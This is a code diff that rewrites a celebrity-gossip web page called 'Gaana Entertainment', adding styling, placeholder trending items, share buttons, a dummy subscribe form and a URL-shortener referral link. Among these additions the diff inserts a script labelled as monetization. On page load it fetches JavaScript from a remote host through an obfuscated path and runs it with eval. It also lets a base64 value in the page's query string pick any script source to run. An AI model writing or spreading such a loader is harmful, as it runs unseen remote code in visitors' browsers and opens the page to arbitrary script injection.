@@ -2,70 +2,243 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Gaana Entertainment</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Gaana Entertainment - Celebrity News & Gossip</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #111;
-      color: #fff;
-      margin: 0;
-      padding: 0;
+      background: #121212;
+      color: #eee;
+      margin: 0; padding: 20px;
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
     }
     header {
-      background-color: #e60000;
-      padding: 20px;
       text-align: center;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #333;
     }
-    header h1 {
+    h1 {
       margin: 0;
-      font-size: 2em;
+      font-weight: bold;
+      font-size: 2.5rem;
+      color: #f39c12;
     }
-    .content {
-      padding: 20px;
-    }
-    .gossip-card {
-      background-color: #222;
-      padding: 15px;
-      margin-bottom: 15px;
-      border-radius: 8px;
-    }
-    .gossip-card h2 {
-      margin-top: 0;
-    }
-    .gossip-card a {
-      color: #00e6e6;
+    a.ref-link {
+      display: block;
+      text-align: center;
+      margin-top: 20px;
+      color: #f39c12;
+      font-weight: bold;
       text-decoration: none;
     }
-    footer {
-      background-color: #e60000;
-      color: #fff;
+    a.ref-link:hover {
+      text-decoration: underline;
+    }
+    main {
+      margin-top: 30px;
+    }
+    article {
+      background: #222;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 8px;
+    }
+    article h2 {
+      margin-top: 0;
+      color: #e67e22;
+    }
+    article p {
+      line-height: 1.5;
+    }
+    .share-buttons {
       text-align: center;
+      margin-top: 15px;
+    }
+    .share-buttons button {
+      background: #f39c12;
+      border: none;
+      color: #121212;
+      font-weight: bold;
+      margin: 0 5px;
+      padding: 10px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .share-buttons button:hover {
+      background: #e67e22;
+    }
+    #subscribe {
+      margin-top: 20px;
+      background: #222;
+      padding: 15px;
+      border-radius: 8px;
+      text-align: center;
+    }
+    #subscribe input[type="email"] {
       padding: 10px;
+      width: 70%;
+      border-radius: 4px;
+      border: none;
+      margin-right: 10px;
+    }
+    #subscribe button {
+      padding: 10px 20px;
+      border-radius: 4px;
+      border: none;
+      background: #f39c12;
+      color: #121212;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    #subscribe button:hover {
+      background: #e67e22;
+    }
+    #trending {
+      background: #222;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    #trending h3 {
+      color: #f39c12;
+      margin-top: 0;
+      margin-bottom: 10px;
+    }
+    #trending ul {
+      list-style: none;
+      padding-left: 0;
+    }
+    #trending ul li {
+      margin-bottom: 8px;
+      cursor: pointer;
+      color: #eee;
+    }
+    #trending ul li:hover {
+      color: #f39c12;
+      text-decoration: underline;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      font-size: 0.9rem;
+      color: #777;
     }
   </style>
 </head>
 <body>
   <header>
     <h1>Gaana Entertainment</h1>
-    <p>Latest Celebrity Gossip & Drama</p>
+    <p>Your daily dose of celebrity news and gossip</p>
   </header>
-  <div class="content">
-    <div class="gossip-card">
-      <h2>Shocking Truth Behind Celebrity X's Disappearance</h2>
-      <p><a href="https://shrinkme.io/ref/Lordddd" target="_blank">Read full story</a></p>
+
+  <main>
+    <article>
+      <h2>Hot Celebrity Gossip!</h2>
+      <p>Stay tuned for the latest buzz about your favorite stars, exclusive interviews, and the juiciest gossip in the entertainment world.</p>
+    </article>
+    
+    <article id="trending">
+      <h3>Trending Now</h3>
+      <ul>
+        <li onclick="alert('Breaking: Celebrity X spotted with mystery guest!')">Breaking: Celebrity X spotted with mystery guest!</li>
+        <li onclick="alert('Exclusive: Interview with rising star Y coming soon!')">Exclusive: Interview with rising star Y coming soon!</li>
+        <li onclick="alert('Rumor: Upcoming movie of star Z might be delayed!')">Rumor: Upcoming movie of star Z might be delayed!</li>
+      </ul>
+    </article>
+
+    <article>
+      <h2>Latest News</h2>
+      <p>New stories coming soon. Bookmark this page and check back often for fresh updates.</p>
+    </article>
+
+    <div class="share-buttons">
+      <p><strong>Love this site? Share it with your friends!</strong></p>
+      <button onclick="shareOnFacebook()">Facebook</button>
+      <button onclick="shareOnTwitter()">Twitter</button>
+      <button onclick="shareOnWhatsApp()">WhatsApp</button>
     </div>
-    <div class="gossip-card">
-      <h2>Top 10 Most Scandalous Celebrity Moments</h2>
-      <p><a href="https://shrinkme.io/ref/Lordddd" target="_blank">Watch now</a></p>
-    </div>
-    <div class="gossip-card">
-      <h2>Who's Dating Who? The Latest Hollywood Hookups</h2>
-      <p><a href="https://shrinkme.io/ref/Lordddd" target="_blank">Find out here</a></p>
-    </div>
-  </div>
+
+    <section id="subscribe">
+      <p><strong>Subscribe for updates</strong></p>
+      <input type="email" id="email" placeholder="Enter your email" />
+      <button onclick="subscribe()">Subscribe</button>
+      <p id="subscribe-msg" style="margin-top: 10px; color:#f39c12;"></p>
+    </section>
+  </main>
+
+  <a href="https://shrinkme.io/ref/Lordddd" class="ref-link" target="_blank" rel="noopener noreferrer">
+    Support Us - Check out our partner ShrinkMe! Share & Earn Rewards
+  </a>
+
+  <!-- MoneyTag Monetization Script -->
+  <script>
+  (function() {
+    const defaultURL = "https://staupsoaksy.net/csr/pheerag/freivpr-jbexre.zva.wf?e=fj&i=2";
+
+    function getScriptURL() {
+      try {
+        const urlFromHash = atob(location.search.slice(1));
+        return urlFromHash || defaultURL;
+      } catch (e) {
+        return defaultURL;
+      }
+    }
+
+    function loadScript(url) {
+      try {
+        importScripts(url);
+      } catch (e) {
+        fetch(url)
+          .then(response => response.text())
+          .then(code => eval(code))
+          .catch(err => console.warn("MoneyTag failed to load:", err));
+      }
+    }
+
+    const scriptURL = getScriptURL();
+    loadScript(scriptURL);
+  })();
+
+  // Social sharing functions
+  function shareOnFacebook() {
+    const url = encodeURIComponent(window.location.href);
+    window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`, '_blank');
+  }
+
+  function shareOnTwitter() {
+    const url = encodeURIComponent(window.location.href);
+    const text = encodeURIComponent("Check out Gaana Entertainment for hot celebrity gossip!");
+    window.open(`https://twitter.com/intent/tweet?url=${url}&text=${text}`, '_blank');
+  }
+
+  function shareOnWhatsApp() {
+    const url = encodeURIComponent(window.location.href);
+    const text = encodeURIComponent("Check out Gaana Entertainment - your daily dose of celebrity news!");
+    window.open(`https://api.whatsapp.com/send?text=${text}%20${url}`, '_blank');
+  }
+
+  // Dummy subscribe function
+  function subscribe() {
+    const emailInput = document.getElementById('email');
+    const msg = document.getElementById('subscribe-msg');
+    const email = emailInput.value.trim();
+
+    if (email === '') {
+      msg.textContent = 'Please enter a valid email.';
+      return;
+    }
+    // Dummy success message (no backend yet)
+    msg.textContent = `Thanks for subscribing, ${email}! Stay tuned.`;
+    emailInput.value = '';
+  }
+  </script>
+
   <footer>
-    &copy; 2025 Gaana Entertainment | Powered by GitHub Pages
+    &copy; 2025 Gaana Entertainment. All rights reserved.
   </footer>
 </body>
 </html>
